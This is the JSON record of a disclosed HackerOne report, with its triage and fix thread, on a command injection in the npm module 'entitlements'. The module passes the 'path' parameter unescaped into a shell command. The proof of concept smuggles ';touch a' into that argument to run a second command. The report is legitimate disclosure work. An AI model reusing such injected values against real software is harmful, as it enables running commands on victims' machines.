{"id":341869,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDE4Njk=","url":"https://hackerone.com/reports/341869","title":"[entitlements] Command injection on the 'path' parameter","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-04-22T22:32:14.171Z","submitted_at":"2018-04-22T22:32:14.171Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"caioluders","url":"/caioluders","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/127/884/dc42ad1f26281d390990096c4ec2fc5c20c2a31b_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-07-18T09:18:12.595Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-07-18T09:18:03.171Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello again, another command injection, this time on the `entitlements` module.\n\n# Module\n\n**module name:** entitlements\n**version:** 1.2.0\n**npm page:** https://www.npmjs.com/package/entitlements\n\n## Module Description\n\n\u003e check the entitlements of a .app bundle\n\n## Module Stats\n\n26 downloads in the last day\n328 downloads in the last week\n896 downloads in the last month\n14783 downloads in the last year\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module appends the `path` parameter to a command on the line [7](https://github.com/matiassingers/entitlements/blob/master/index.js#L7) without escaping it, leading to a command injection.\n\n## Steps To Reproduce:\n\n* Install the module\n\n```\n$ npm install entitlements\n```\n\n* Example code with the malicious payload \";touch a\" on line 3.\n\n```javascript\nvar entitlements = require('entitlements');\n\nentitlements(';touch a', function(error, data){\n  console.log(data);\n});\n```\n\n* Run it.\n\n```\n$ node index.js\n```\n\n* Check the newly create file a\n\n```\n$ ls\na       index.js\n```\n\n## Patch\n\nIt is advisable to use a module that explicitly isolates the parameters to the `codesign` command.\n\n## Supporting Material/References:\n\n*  macOS Sierra 10.12.16\n* NODEJS v8.4.0\n*  NPM 5.3.0\n\n# Wrap up\n\n**( contacted the maintainer || opened issue ) = False**\n\n## Impact\n\nAn attacker that controls the `path` parameter can inject commands on the victim's machine.","vulnerability_information_html":"\u003cp\u003eHello again, another command injection, this time on the \u003ccode\u003eentitlements\u003c/code\u003e module.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e entitlements\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 1.2.0\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ca title=\"https://www.npmjs.com/package/entitlements\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fentitlements\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/package/entitlements\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003echeck the entitlements of a .app bundle\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e26 downloads in the last day\u003cbr\u003e\n328 downloads in the last week\u003cbr\u003e\n896 downloads in the last month\u003cbr\u003e\n14783 downloads in the last year\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThe module appends the \u003ccode\u003epath\u003c/code\u003e parameter to a command on the line \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmatiassingers%2Fentitlements%2Fblob%2Fmaster%2Findex.js%23L7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e without escaping it, leading to a command injection.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eInstall the module\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ npm install entitlements\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eExample code with the malicious payload \u0026quot;;touch a\u0026quot; on line 3.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eentitlements\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eentitlements\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eentitlements\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;touch a\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eRun it.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ node index.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eCheck the newly create file a\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls\na       index.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eIt is advisable to use a module that explicitly isolates the parameters to the \u003ccode\u003ecodesign\u003c/code\u003e command.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e macOS Sierra 10.12.16\u003c/li\u003e\n\u003cli\u003eNODEJS v8.4.0\u003c/li\u003e\n\u003cli\u003e NPM 5.3.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003e( contacted the maintainer || opened issue ) = False\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker that controls the \u003ccode\u003epath\u003c/code\u003e parameter can inject commands on the victim\u0026#39;s machine.\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-08-17T09:18:03.396Z","allow_singular_disclosure_after":-74722865.58160932,"singular_disclosure_allowed":true,"vote_count":5,"voters":["bl4de","mygf","eveeez","sa1tama0","cryptographer"],"severity":{"rating":"high","score":7.5,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":8778,"asset_type":"SOURCE_CODE","asset_identifier":"entitlements","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2653227,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @caioluders ,\n\nThanks for reporting this issue.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue.\n","markdown_message":"\u003cp\u003eHi @caioluders ,\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\u003cbr\u003e\nI will invite the package maintainer to this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T12:14:11.780Z","updated_at":"2018-04-23T12:14:11.780Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2653231,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-23T12:16:07.479Z","updated_at":"2018-04-23T12:16:07.479Z","additional_data":{"old_severity":"High","new_severity":"High (7.5)","old_severity_id":143980,"new_severity_id":144103},"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2805801,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I opened up an issue on GitHub: https://github.com/matiassingers/entitlements/issues/2.","markdown_message":"\u003cp\u003eI opened up an issue on GitHub: \u003ca title=\"https://github.com/matiassingers/entitlements/issues/2\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmatiassingers%2Fentitlements%2Fissues%2F2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/matiassingers/entitlements/issues/2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T11:43:06.149Z","updated_at":"2018-05-28T11:43:06.149Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3014923,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-09T08:06:50.592Z","updated_at":"2018-07-09T08:06:50.592Z","actor":{"username":"matiassingers2","cleared":false,"url":"/matiassingers2","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3046364,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This issue has been fixed in v1.3.0 (published to NPM as well)","markdown_message":"\u003cp\u003eThis issue has been fixed in v1.3.0 (published to NPM as well)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-15T08:10:58.297Z","updated_at":"2018-07-15T08:10:58.297Z","actor":{"username":"matiassingers2","cleared":false,"url":"/matiassingers2","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3060896,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm that this problem has been fixed in 1.3.0. I will proceed with the disclosure.","markdown_message":"\u003cp\u003eI can confirm that this problem has been fixed in 1.3.0. I will proceed with the disclosure.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-18T09:17:43.772Z","updated_at":"2018-07-18T09:17:43.772Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3060898,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-18T09:17:54.432Z","updated_at":"2018-07-18T09:17:54.432Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"caioluders","url":"/caioluders"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3060899,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-18T09:18:03.212Z","updated_at":"2018-07-18T09:18:03.212Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3060900,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-18T09:18:12.396Z","updated_at":"2018-07-18T09:18:12.396Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3357615,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-19T09:30:44.822Z","updated_at":"2018-09-19T09:30:44.822Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Other module","new_scope":"entitlements","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}